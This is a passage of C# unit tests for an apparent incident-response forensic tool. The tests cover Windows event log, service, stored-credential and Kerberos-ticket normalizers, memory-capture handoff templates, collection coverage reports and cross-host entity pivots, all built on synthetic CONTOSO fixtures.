            string label = ArtifactNames.GetEventLogLabelFromFileName(input);
            return string.Equals(label, input, StringComparison.Ordinal);
        }

        private static bool CaseManager_GetRelativePath_accepts_child()
        {
            string root = Path.Combine(Path.GetTempPath(), "IRCollectRelA_" + Guid.NewGuid().ToString("N"));
            string child = Path.Combine(root, "EventLogs", "Security_filtered.csv");
            try
            {
                Directory.CreateDirectory(Path.GetDirectoryName(child));
                File.WriteAllText(child, "x");
                string rel = InvokeCaseManagerGetRelativePath(root, child);
                return string.Equals(rel, Path.Combine("EventLogs", "Security_filtered.csv"), StringComparison.OrdinalIgnoreCase);
            }
            finally
            {
                TryDeleteDir(root);
            }
        }

        private static bool CaseManager_GetRelativePath_rejects_prefix_sibling()
        {
            string root = Path.Combine(Path.GetTempPath(), "IRCollectRelB_" + Guid.NewGuid().ToString("N"));
            string siblingRoot = root + "_X";
            string siblingFile = Path.Combine(siblingRoot, "outside.csv");
            try
            {
                Directory.CreateDirectory(root);
                Directory.CreateDirectory(siblingRoot);
                File.WriteAllText(siblingFile, "x");
                string rel = InvokeCaseManagerGetRelativePath(root, siblingFile);
                return string.Equals(rel, "outside.csv", StringComparison.OrdinalIgnoreCase);
            }
            finally
            {
                TryDeleteDir(root);
                TryDeleteDir(siblingRoot);
            }
        }

        private static string InvokeCaseManagerGetRelativePath(string root, string path)
        {
            MethodInfo method = typeof(CaseManager).GetMethod("GetRelativePath", BindingFlags.NonPublic | BindingFlags.Static);
            if (method == null) throw new InvalidOperationException("CaseManager.GetRelativePath not found.");
            object value = method.Invoke(null, new object[] { root, path });
            return value as string ?? "";
        }

        private static bool EventLog_1149_message_fallback_adds_target_user()
        {
            string dir = CreateTempDir("IRCollectEvt1149Fallback_");
            try
            {
                string csv = Path.Combine(dir, "TerminalServices_filtered.csv");
                WriteEventLogCsv(csv, new[]
                {
                    BuildEventLogRow(
                        "2026-04-08T10:00:00Z",
                        "1149",
                        "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
                        "RDP authentication succeeded for CONTOSO\\alice from 10.0.0.5.",
                        "ClientAddress=10.0.0.5")
                });

                List<Fact> facts = EventLogNormalizer.ToFacts(csv, "TerminalServices");
                if (facts.Count != 1) return false;

                Fact fact = facts[0];
                return HasEntity(fact, "TargetUser", "CONTOSO\\alice")
                    && HasEntity(fact, "RemoteIP", "10.0.0.5")
                    && string.Equals(fact.Action, "RemoteDesktopAuthenticated", StringComparison.Ordinal);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool EventLog_1149_structured_target_user_is_not_duplicated()
        {
            string dir = CreateTempDir("IRCollectEvt1149Structured_");
            try
            {
                string csv = Path.Combine(dir, "TerminalServices_filtered.csv");
                WriteEventLogCsv(csv, new[]
                {
                    BuildEventLogRow(
                        "2026-04-08T10:01:00Z",
                        "1149",
                        "Microsoft-Windows-TerminalServices-RemoteConnectionManager",
                        "RDP authentication succeeded for CONTOSO\\alice from 10.0.0.5.",
                        "User=alice | Domain=CONTOSO | ClientAddress=10.0.0.5")
                });

                List<Fact> facts = EventLogNormalizer.ToFacts(csv, "TerminalServices");
                if (facts.Count != 1) return false;

                Fact fact = facts[0];
                int targetUserCount = CountEntities(fact, "TargetUser", "CONTOSO\\alice");
                return targetUserCount == 1;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool EventLog_5145_relative_target_name_maps_to_path()
        {
            string dir = CreateTempDir("IRCollectEvt5145_");
            try
            {
                string csv = Path.Combine(dir, "Security_filtered.csv");
                WriteEventLogCsv(csv, new[]
                {
                    BuildEventLogRow(
                        "2026-04-08T10:02:00Z",
                        "5145",
                        "Microsoft-Windows-Security-Auditing",
                        "Share access checked for docs\\secret.txt.",
                        "SubjectDomainName=CONTOSO | SubjectUserName=bob | ShareName=\\\\server\\share | ShareLocalPath=C:\\Shares\\Team | RelativeTargetName=docs\\secret.txt | IpAddress=10.0.0.9 | IpPort=445")
                });

                List<Fact> facts = EventLogNormalizer.ToFacts(csv, "Security");
                if (facts.Count != 1) return false;

                Fact fact = facts[0];
                return HasEntity(fact, "Path", "docs\\secret.txt")
                    && HasEntity(fact, "ShareLocalPath", "C:\\Shares\\Team")
                    && !HasEntity(fact, "ShareLocalPath", "docs\\secret.txt")
                    && string.Equals(fact.Action, "ShareAccessChecked", StringComparison.Ordinal);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool EventLog_blank_time_keeps_fact_with_entities_low_confidence()
        {
            string dir = CreateTempDir("IRCollectEvtBlankTime_");
            try
            {
                string csv = Path.Combine(dir, "Security_filtered.csv");
                WriteEventLogCsv(csv, new[]
                {
                    BuildEventLogRow(
                        "",   // blank / unparseable TimeCreated
                        "4624",
                        "Microsoft-Windows-Security-Auditing",
                        "An account was successfully logged on.",
                        "TargetUserName=alice | IpAddress=10.0.0.7 | LogonType=3")
                });

                List<Fact> facts = EventLogNormalizer.ToFacts(csv, "Security");
                if (facts.Count != 1) return false; // must NOT be dropped
                Fact fact = facts[0];
                return HasEntity(fact, "User", "alice")
                    && HasEntity(fact, "RemoteIP", "10.0.0.7")
                    && fact.Time == DateTime.MinValue
                    && string.Equals(fact.TimeConfidence, FactTimeMetadata.LowConfidence, StringComparison.Ordinal)
                    && fact.FallbackUsed
                    && (fact.ParserNote ?? "").IndexOf("TimeCreated missing", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryHandoff_resolve_acquire_and_analyze_arg_templates()
        {
            return string.Equals(MemoryHandoffHelper.ResolveAcquireArgsTemplate(null, MemoryHandoffHelper.AcquirePresetWinPmemO), "-o \"{OutputPath}\"", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAcquireArgsTemplate(" /Q ", MemoryHandoffHelper.AcquirePresetQuotedOutput), "\"{OutputPath}\" /Q", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAcquireArgsTemplate("--slow", MemoryHandoffHelper.AcquirePresetWinPmemO), "-o \"{OutputPath}\" --slow", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAcquireArgsTemplate(null, MemoryHandoffHelper.AcquirePresetWinPmemRaw), "--format raw -o \"{OutputPath}\"", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAcquireArgsTemplate(" /Y {OutputPath} ", MemoryHandoffHelper.AcquirePresetCustom), "/Y {OutputPath}", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAnalyzeArgsTemplate(null, MemoryHandoffHelper.AnalyzePresetDualQuoted), "\"{InputPath}\" \"{OutputDir}\"", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAnalyzeArgsTemplate(null, MemoryHandoffHelper.AnalyzePresetInputOutputFlags), "-i \"{InputPath}\" -o \"{OutputDir}\"", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAnalyzeArgsTemplate(null, MemoryHandoffHelper.AnalyzePresetVolatility3OutputDir), "-f \"{InputPath}\" --output-dir \"{OutputDir}\"", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.ResolveAnalyzeArgsTemplate("custom {CaseDir}", MemoryHandoffHelper.AnalyzePresetCustom), "custom {CaseDir}", StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.NormalizeAcquireValidationMode("min_size"), MemoryHandoffHelper.AcquireValidationMinSize, StringComparison.Ordinal)
                && string.Equals(MemoryHandoffHelper.NormalizeAnalyzeValidationMode("required_patterns"), MemoryHandoffHelper.AnalyzeValidationRequiredPatterns, StringComparison.Ordinal);
        }

        private static bool MemoryHandoff_finalize_analysis_disk_reconciles_missing_outputs()
        {
            string dir = CreateTempDir("IRCollectMemHandoffFin_");
            try
            {
                var rec = new MemoryAnalysisRecord
                {
                    Status = "complete",
                    Detail = "Analyzer reported success.",
                    OutputDirectoryRelativePath = ArtifactNames.MemoryAnalysisFolder,
                    OutputFiles = new List<string> { ArtifactNames.MemoryAnalysisFolder + "\\missing.txt" },
                    OutputFileCount = 1
                };
                MemoryHandoffHelper.FinalizeAnalysisRecordAgainstDisk(dir, rec);
                return string.Equals(rec.Status, "failed", StringComparison.OrdinalIgnoreCase)
                    && (rec.Detail ?? "").IndexOf("[Reconciled]", StringComparison.OrdinalIgnoreCase) >= 0
                    && (rec.Detail ?? "").IndexOf("output missing", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryCoverage_complete_with_missing_dump_becomes_failed()
        {
            string dir = CreateTempDir("IRCollectMemCoverageComplete_");
            try
            {
                MemoryAcquisitionRecord.SaveToFile(new MemoryAcquisitionRecord
                {
                    Status = "complete",
                    Detail = "External tool reported success.",
                    OutputRelativePath = ArtifactNames.MemoryFolder + "\\memory.raw"
                }, Path.Combine(dir, ArtifactNames.MemoryAcquisitionJson));

                CollectionCoverageStep step = InvokeBuildMemoryAcquisitionCoverageStep(dir, new List<string>());
                if (step == null) return false;
                if (!string.Equals(step.Status, "failed", StringComparison.OrdinalIgnoreCase)) return false;
                if (step.ArtifactsMissing == null || !step.ArtifactsMissing.Contains(ArtifactNames.MemoryFolder + "\\memory.raw")) return false;
                return (step.Detail ?? "").IndexOf("Sidecar reported complete but expected dump is absent", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryCoverage_partial_with_missing_dump_stays_partial()
        {
            string dir = CreateTempDir("IRCollectMemCoveragePartial_");
            try
            {
                MemoryAcquisitionRecord.SaveToFile(new MemoryAcquisitionRecord
                {
                    Status = "partial",
                    Detail = "Tool exited 0 but output file was not found.",
                    OutputRelativePath = ArtifactNames.MemoryFolder + "\\memory.raw"
                }, Path.Combine(dir, ArtifactNames.MemoryAcquisitionJson));

                CollectionCoverageStep step = InvokeBuildMemoryAcquisitionCoverageStep(dir, new List<string>());
                if (step == null) return false;
                if (!string.Equals(step.Status, "partial", StringComparison.OrdinalIgnoreCase)) return false;
                return (step.Detail ?? "").IndexOf("Expected dump absent on disk", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryAnalysisOutputDir_default_folder_allowed()
        {
            string dir = CreateTempDir("IRCollectMemAnalysisDirDefault_");
            try
            {
                string dumpDir = Path.Combine(dir, ArtifactNames.MemoryFolder);
                Directory.CreateDirectory(dumpDir);
                string dumpPath = Path.Combine(dumpDir, "memory.raw");
                File.WriteAllText(dumpPath, "dump", new UTF8Encoding(false));

                string validation = IR_Collect.Collectors.MemoryAnalysisCollector.ValidateAnalysisOutputDirectory(
                    dir,
                    Path.Combine(dir, ArtifactNames.MemoryAnalysisFolder),
                    dumpPath);

                return string.IsNullOrEmpty(validation);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryAnalysisOutputDir_case_root_rejected()
        {
            string dir = CreateTempDir("IRCollectMemAnalysisDirRoot_");
            try
            {
                string dumpDir = Path.Combine(dir, ArtifactNames.MemoryFolder);
                Directory.CreateDirectory(dumpDir);
                string dumpPath = Path.Combine(dumpDir, "memory.raw");
                File.WriteAllText(dumpPath, "dump", new UTF8Encoding(false));

                string validation = IR_Collect.Collectors.MemoryAnalysisCollector.ValidateAnalysisOutputDirectory(dir, dir, dumpPath);
                return !string.IsNullOrEmpty(validation) &&
                    validation.IndexOf("case root", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryAnalysisOutputDir_reserved_evidence_dir_rejected()
        {
            string dir = CreateTempDir("IRCollectMemAnalysisDirReserved_");
            try
            {
                string dumpDir = Path.Combine(dir, ArtifactNames.MemoryFolder);
                Directory.CreateDirectory(dumpDir);
                string dumpPath = Path.Combine(dumpDir, "memory.raw");
                File.WriteAllText(dumpPath, "dump", new UTF8Encoding(false));

                string validation = IR_Collect.Collectors.MemoryAnalysisCollector.ValidateAnalysisOutputDirectory(
                    dir,
                    Path.Combine(dir, "EventLogs"),
                    dumpPath);

                return !string.IsNullOrEmpty(validation) &&
                    validation.IndexOf("reserved evidence directory", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryAnalysisCoverage_complete_with_outputs_is_complete()
        {
            string dir = CreateTempDir("IRCollectMemAnalysisComplete_");
            try
            {
                string outputDir = Path.Combine(dir, ArtifactNames.MemoryAnalysisFolder);
                Directory.CreateDirectory(outputDir);
                File.WriteAllText(Path.Combine(outputDir, "pslist.json"), "{ }", new UTF8Encoding(false));
                MemoryAnalysisRecord.SaveToFile(new MemoryAnalysisRecord
                {
                    Status = "complete",
                    Detail = "Analyzer reported success.",
                    OutputDirectoryRelativePath = ArtifactNames.MemoryAnalysisFolder,
                    OutputFiles = new List<string> { ArtifactNames.MemoryAnalysisFolder + "\\pslist.json" },
                    OutputFileCount = 1,
                    OutputTotalBytes = 3
                }, Path.Combine(dir, ArtifactNames.MemoryAnalysisJson));

                CollectionCoverageStep step = InvokeBuildMemoryAnalysisCoverageStep(dir, new List<string>());
                return step != null
                    && string.Equals(step.Status, "complete", StringComparison.OrdinalIgnoreCase)
                    && step.ArtifactsPresent != null
                    && step.ArtifactsPresent.Any(v => string.Equals(v, ArtifactNames.MemoryAnalysisFolder + "\\pslist.json", StringComparison.OrdinalIgnoreCase));
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool EventLogCoverage_label_mismatch_is_partial()
        {
            string dir = CreateTempDir("IRCollectEventCoverageParity_");
            try
            {
                string logsDir = Path.Combine(dir, "EventLogs");
                Directory.CreateDirectory(logsDir);
                File.WriteAllText(Path.Combine(logsDir, "Security.evtx"), "raw", new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(logsDir, "System.evtx"), "raw", new UTF8Encoding(false));
                File.WriteAllText(Path.Combine(logsDir, "Security_filtered.csv"), "TimeCreated,EventId\r\n", new UTF8Encoding(false));

                CollectionCoverageStep step = InvokeBuildEventLogCoverageStep(dir, new List<string>());
                return step != null
                    && string.Equals(step.Status, "partial", StringComparison.OrdinalIgnoreCase)
                    && step.ArtifactsMissing != null
                    && step.ArtifactsMissing.Any(v => string.Equals(v, Path.Combine("EventLogs", "System_filtered.csv"), StringComparison.OrdinalIgnoreCase))
                    && (step.Detail ?? "").IndexOf("missing filtered CSV for: System", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ExecutionArtifactsCoverage_failed_with_present_artifact_stays_failed()
        {
            string dir = CreateTempDir("IRCollectExecCoverageFailed_");
            try
            {
                File.WriteAllText(Path.Combine(dir, ArtifactNames.BitsJobsCsv), "DisplayName,OwnerAccount\r\n", new UTF8Encoding(false));

                CollectionCoverageStep step = InvokeBuildExecutionArtifactsCoverageStep(dir, new List<string> { "Execution Artifacts" });
                return step != null &&
                    string.Equals(step.Status, "failed", StringComparison.OrdinalIgnoreCase) &&
                    step.ArtifactsPresent != null &&
                    step.ArtifactsPresent.Any(v => string.Equals(v, ArtifactNames.BitsJobsCsv, StringComparison.OrdinalIgnoreCase));
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CollectionCoverage_failed_step_with_present_artifact_makes_overall_failed()
        {
            string dir = CreateTempDir("IRCollectCoverageFailedOverall_");
            try
            {
                File.WriteAllText(Path.Combine(dir, ArtifactNames.BitsJobsCsv), "DisplayName,OwnerAccount\r\n", new UTF8Encoding(false));

                CollectionCoverageReport report = InvokeBuildCollectionCoverageReport(
                    dir,
                    "CaseExecFailed",
                    new List<string> { "Execution Artifacts" },
                    CollectionModeProfileHelper.Standard);

                CollectionCoverageStep step = report != null && report.Steps != null
                    ? report.Steps.FirstOrDefault(s => s != null && string.Equals(s.Step, "Execution Artifacts", StringComparison.OrdinalIgnoreCase))
                    : null;

                return report != null &&
                    string.Equals(report.OverallStatus, "failed", StringComparison.OrdinalIgnoreCase) &&
                    report.FailedSteps > 0 &&
                    step != null &&
                    string.Equals(step.Status, "failed", StringComparison.OrdinalIgnoreCase);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CollectionCoverage_missing_steps_make_overall_partial()
        {
            string dir = CreateTempDir("IRCollectCoverageOverall_");
            try
            {
                File.WriteAllText(Path.Combine(dir, ArtifactNames.SystemInfoTxt), "ok", new UTF8Encoding(false));
                CollectionCoverageReport report = InvokeBuildCollectionCoverageReport(dir, "CaseA", new List<string>(), CollectionModeProfileHelper.Standard);
                return report != null &&
                    string.Equals(report.OverallStatus, "partial", StringComparison.OrdinalIgnoreCase) &&
                    report.MissingSteps > 0 &&
                    string.Equals(report.CollectionModeProfile, CollectionModeProfileHelper.Standard, StringComparison.Ordinal);
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool CollectionResult_coverage_failed_step_sets_has_errors()
        {
            var result = new Collector.CollectionResult
            {
                FailedSteps = new List<string>(),
                CoverageReport = new CollectionCoverageReport
                {
                    OverallStatus = "failed",
                    Steps = new List<CollectionCoverageStep>
                    {
                        new CollectionCoverageStep { Step = "Memory analysis handoff", Status = "failed", Detail = "coverage downgrade" }
                    }
                }
            };

            return result.HasErrors &&
                string.Equals(result.BuildFailureSummary(), "Memory analysis handoff", StringComparison.OrdinalIgnoreCase);
        }

        private static bool MemoryAnalysisCoverage_complete_without_outputs_becomes_failed()
        {
            string dir = CreateTempDir("IRCollectMemAnalysisMissing_");
            try
            {
                MemoryAnalysisRecord.SaveToFile(new MemoryAnalysisRecord
                {
                    Status = "complete",
                    Detail = "Analyzer reported success.",
                    OutputDirectoryRelativePath = ArtifactNames.MemoryAnalysisFolder,
                    OutputFiles = new List<string>(),
                    OutputFileCount = 0
                }, Path.Combine(dir, ArtifactNames.MemoryAnalysisJson));

                CollectionCoverageStep step = InvokeBuildMemoryAnalysisCoverageStep(dir, new List<string>());
                return step != null
                    && string.Equals(step.Status, "failed", StringComparison.OrdinalIgnoreCase)
                    && (step.Detail ?? "").IndexOf("analysis outputs are absent", StringComparison.OrdinalIgnoreCase) >= 0;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryAcquisitionNormalizer_ToFacts_emits_summary_and_output_facts()
        {
            string dir = CreateTempDir("IRCollectMemNormA_");
            try
            {
                string jsonPath = Path.Combine(dir, ArtifactNames.MemoryAcquisitionJson);
                MemoryAcquisitionRecord.SaveToFile(new MemoryAcquisitionRecord
                {
                    Status = "complete",
                    Detail = "Capture completed.",
                    ArgsPreset = MemoryHandoffHelper.AcquirePresetWinPmemRaw,
                    OutputRelativePath = ArtifactNames.MemoryFolder + "\\memory.raw",
                    OutputFileSizeBytes = 4096,
                    OutputSha256 = "ABCDEF0123456789",
                    CollectorUser = @"DOMAIN\alice",
                    ValidationStatus = "passed",
                    DiagnosticCategory = "success",
                    EndedAtUtc = "2026-04-08T12:00:00Z"
                }, jsonPath);

                var facts = MemoryAcquisitionNormalizer.ToFacts(jsonPath);
                if (facts == null || facts.Count != 2)
                    return false;
                return facts.Any(f => string.Equals(f.Action, "MemoryAcquisitionComplete", StringComparison.Ordinal)) &&
                    facts.Any(f => string.Equals(f.Action, MemoryAcquisitionNormalizer.ActionOutputObserved, StringComparison.Ordinal) &&
                                   HasEntity(f, "Path", ArtifactNames.MemoryFolder + "\\memory.raw") &&
                                   HasEntity(f, "Hash", "ABCDEF0123456789"));
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool MemoryAnalysisNormalizer_ToFacts_emits_summary_and_output_facts()
        {
            string dir = CreateTempDir("IRCollectMemNormB_");
            try
            {
                string jsonPath = Path.Combine(dir, ArtifactNames.MemoryAnalysisJson);
                MemoryAnalysisRecord.SaveToFile(new MemoryAnalysisRecord
                {
                    Status = "partial",
                    Detail = "Analyzer produced output but one validation pattern was missing.",
                    ArgsPreset = MemoryHandoffHelper.AnalyzePresetVolatility3OutputDir,
                    InputRelativePath = ArtifactNames.MemoryFolder + "\\memory.raw",
                    OutputDirectoryRelativePath = ArtifactNames.MemoryAnalysisFolder,
                    OutputFiles = new List<string> { ArtifactNames.MemoryAnalysisFolder + "\\pslist.json" },
                    OutputFileCount = 1,
                    OutputTotalBytes = 2048,
                    CollectorUser = @"DOMAIN\bob",
                    ValidationStatus = "failed",
                    MissingOutputPatterns = new List<string> { "handles*.json" },
                    DiagnosticCategory = "output_validation_failed",
                    EndedAtUtc = "2026-04-08T12:05:00Z"
                }, jsonPath);

                var facts = MemoryAnalysisNormalizer.ToFacts(jsonPath);
                if (facts == null || facts.Count != 2)
                    return false;
                return facts.Any(f => string.Equals(f.Action, "MemoryAnalysisPartial", StringComparison.Ordinal) &&
                                      HasEntity(f, "InputPath", ArtifactNames.MemoryFolder + "\\memory.raw")) &&
                    facts.Any(f => string.Equals(f.Action, MemoryAnalysisNormalizer.ActionOutputObserved, StringComparison.Ordinal) &&
                                   HasEntity(f, "Path", ArtifactNames.MemoryAnalysisFolder + "\\pslist.json"));
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool ServiceNormalizer_ToFacts_maps_service_name_and_path()
        {
            string dir = CreateTempDir("IRCollectSvcNorm_");
            try
            {
                string csvPath = Path.Combine(dir, ArtifactNames.ServicesCsv);
                File.WriteAllText(csvPath,
                    "Node,DisplayName,Name,PathName,StartMode,State\n" +
                    "HOST01,Updater Service,UpdaterSvc,\"C:\\Users\\Public\\svc.exe -service\",Auto,Running\n",
                    new UTF8Encoding(false));

                var facts = ServiceNormalizer.ToFacts(csvPath);
                if (facts == null || facts.Count != 1)
                    return false;

                Fact f = facts[0];
                return string.Equals(f.Source, ServiceNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, ServiceNormalizer.ActionServiceConfigurationObserved, StringComparison.Ordinal) &&
                    HasEntity(f, "ServiceName", "UpdaterSvc") &&
                    HasEntity(f, "Path", @"C:\Users\Public\svc.exe -service") &&
                    HasEntity(f, "Path", @"C:\Users\Public\svc.exe");
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool StoredCredentialNormalizer_ToFacts_maps_target_user_server()
        {
            string dir = CreateTempDir("IRCollectCredNorm_");
            try
            {
                string path = Path.Combine(dir, ArtifactNames.StoredCredentialsTxt);
                File.WriteAllText(path,
                    "ObservedAtUtc: 2026-04-09T01:02:03Z\n" +
                    "Currently stored credentials:\n\n" +
                    "    Target: Domain:target=TERMSRV/FILE01\n" +
                    "    Type: Domain Password\n" +
                    "    User: CONTOSO\\\\alice\n",
                    new UTF8Encoding(false));

                var facts = StoredCredentialNormalizer.ToFacts(path);
                if (facts == null || facts.Count != 1)
                    return false;

                Fact f = facts[0];
                return string.Equals(f.Source, StoredCredentialNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, StoredCredentialNormalizer.ActionStoredCredentialObserved, StringComparison.Ordinal) &&
                    HasEntity(f, "User", @"CONTOSO\\alice") &&
                    HasEntity(f, "CredentialTarget", "Domain:target=TERMSRV/FILE01") &&
                    HasEntity(f, "TargetServer", "FILE01") &&
                    HasEntity(f, "Workstation", "FILE01");
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool KerberosTicketCacheNormalizer_ToFacts_maps_ticket_entities_and_time()
        {
            string dir = CreateTempDir("IRCollectKerbNorm_");
            try
            {
                string path = Path.Combine(dir, ArtifactNames.KerberosTicketsTxt);
                File.WriteAllText(path,
                    "ObservedAtUtc: 2026-04-09T01:02:03Z\n" +
                    "Current LogonId is 0:0x3e7\n\n" +
                    "Cached Tickets: (1)\n\n" +
                    "#0>     Client: alice @ CONTOSO.LOCAL\n" +
                    "        Server: cifs/FILE01.contoso.local @ CONTOSO.LOCAL\n" +
                    "        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96\n" +
                    "        Ticket Flags: 0x40e10000 -> forwardable renewable\n" +
                    "        Start Time: 4/9/2026 8:36:31 (local)\n" +
                    "        End Time:   4/9/2026 18:36:31 (local)\n" +
                    "        Renew Time: 4/16/2026 8:36:31 (local)\n" +
                    "        Kdc Called: dc01.contoso.local\n",
                    new UTF8Encoding(false));

                var facts = KerberosTicketCacheNormalizer.ToFacts(path);
                if (facts == null || facts.Count != 1)
                    return false;

                Fact f = facts[0];
                return string.Equals(f.Source, KerberosTicketCacheNormalizer.SourceName, StringComparison.Ordinal) &&
                    string.Equals(f.Action, KerberosTicketCacheNormalizer.ActionKerberosTicketCached, StringComparison.Ordinal) &&
                    HasEntity(f, "User", "alice") &&
                    HasEntity(f, "ServiceName", "cifs/FILE01.contoso.local @ CONTOSO.LOCAL") &&
                    HasEntity(f, "TargetServer", "FILE01.contoso.local") &&
                    HasEntity(f, "Workstation", "FILE01.contoso.local") &&
                    f.Time.Year >= 2026;
            }
            finally
            {
                TryDeleteDir(dir);
            }
        }

        private static bool SharedEntityPivot_finds_cross_host_path()
        {
            DateTime t1 = new DateTime(2026, 4, 8, 10, 0, 0, DateTimeKind.Utc);
            DateTime t2 = t1.AddMinutes(5);
            CaseData hostA = CreateSyntheticCase("HostA", CreateFact("A1", t1, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice"));
            CaseData hostB = CreateSyntheticCase("HostB", CreateFact("B1", t2, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice"));

            SharedEntityPivotResult result = SharedEntityPivotBuilder.Build(new[] { hostA, hostB }, "Path", "bad.exe", new SharedEntityPivotOptions { MaxResults = 10 });
            if (result == null || result.Items == null || result.Items.Count != 1) return false;

            SharedEntityPivotItem item = result.Items[0];
            return item.Hosts.Count == 2
                && item.FactCount == 2
                && string.Equals(item.DisplayValue, @"C:\Temp\bad.exe", StringComparison.OrdinalIgnoreCase);
        }

        private static bool RelatedEntityPivot_returns_seed_neighbors()
        {
            DateTime t1 = new DateTime(2026, 4, 8, 10, 0, 0, DateTimeKind.Utc);
            DateTime t2 = t1.AddMinutes(5);
            CaseData hostA = CreateSyntheticCase("HostA", CreateFact("A1", t1, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice", "RemoteIP", "10.0.0.5"));
            CaseData hostB = CreateSyntheticCase("HostB", CreateFact("B1", t2, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice", "RemoteIP", "10.0.0.5"));

            List<RelatedEntityPivotItem> items = SharedEntityPivotBuilder.BuildRelatedEntities(
                new[] { hostA, hostB },
                "Path",
                @"C:\Temp\bad.exe",
                new SharedEntityPivotOptions { MaxResults = 10 });

            if (items == null || items.Count < 2) return false;
            bool hasUser = items.Any(i => string.Equals(i.RelatedType, "User", StringComparison.OrdinalIgnoreCase) &&
                                          string.Equals(i.DisplayValue, @"CONTOSO\alice", StringComparison.OrdinalIgnoreCase) &&
                                          i.Hosts.Count == 2);
            bool hasRemoteIp = items.Any(i => string.Equals(i.RelatedType, "RemoteIP", StringComparison.OrdinalIgnoreCase) &&
                                              string.Equals(i.DisplayValue, "10.0.0.5", StringComparison.OrdinalIgnoreCase) &&
                                              i.Hosts.Count == 2);
            return hasUser && hasRemoteIp;
        }

        private static bool InvestigationGraph_returns_related_edges()
        {
            DateTime t1 = new DateTime(2026, 4, 8, 10, 0, 0, DateTimeKind.Utc);
            DateTime t2 = t1.AddMinutes(5);
            CaseData hostA = CreateSyntheticCase("HostA", CreateFact("A1", t1, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice", "RemoteIP", "10.0.0.5"));
            CaseData hostB = CreateSyntheticCase("HostB", CreateFact("B1", t2, "EventLog:Security", "ProcessCreated", "Path", @"C:\Temp\bad.exe", "User", @"CONTOSO\alice", "RemoteIP", "10.0.0.5"));

            List<InvestigationGraphEdge> edges = InvestigationGraphBuilder.Build(
                new[] { hostA, hostB },
                "Path",
                @"C:\Temp\bad.exe",
                new SharedEntityPivotOptions { MaxResults = 10 });

            if (edges == null || edges.Count < 2) return false;
            InvestigationGraphEdge userEdge = edges.FirstOrDefault(e =>
                string.Equals(e.RelatedType, "User", StringComparison.OrdinalIgnoreCase) &&
                string.Equals(e.DisplayValue, @"CONTOSO\alice", StringComparison.OrdinalIgnoreCase));
            if (userEdge == null) return false;

            List<SharedEntityFactHit> hits = InvestigationGraphBuilder.BuildEdgeFactHits(
                new[] { hostA, hostB },
                userEdge,
                new SharedEntityPivotOptions { MaxResults = 10 },
                true);

            return userEdge.Hosts.Count == 2 && userEdge.FactCount == 2 && hits.Count == 2;
        }

        private static bool TemporalSharedEntityPivot_groups_same_bucket_across_hosts()
        {
            DateTime t1 = new DateTime(2026, 4, 8, 10, 4, 0, DateTimeKind.Utc);
            DateTime t2 = new DateTime(2026, 4, 8, 10, 12, 0, DateTimeKind.Utc);
            CaseData hostA = CreateSyntheticCase("HostA", CreateFact("A1", t1, "EventLog:Security", "ProcessCreated", "RemoteIP", "10.0.0.5", "Path", @"C:\Temp\bad.exe"));
            CaseData hostB = CreateSyntheticCase("HostB", CreateFact("B1", t2, "EventLog:Security", "ProcessCreated", "RemoteIP", "10.0.0.5", "Path", @"C:\Temp\bad.exe"));

            List<TemporalSharedEntityPivotItem> items = SharedEntityPivotBuilder.BuildTemporalCorrelations(
                new[] { hostA, hostB },
                "RemoteIP",
                "10.0.0.5",
                new SharedEntityPivotOptions { MaxResults = 10, BucketMinutes = 30 });

            if (items == null || items.Count != 1) return false;
            TemporalSharedEntityPivotItem item = items[0];
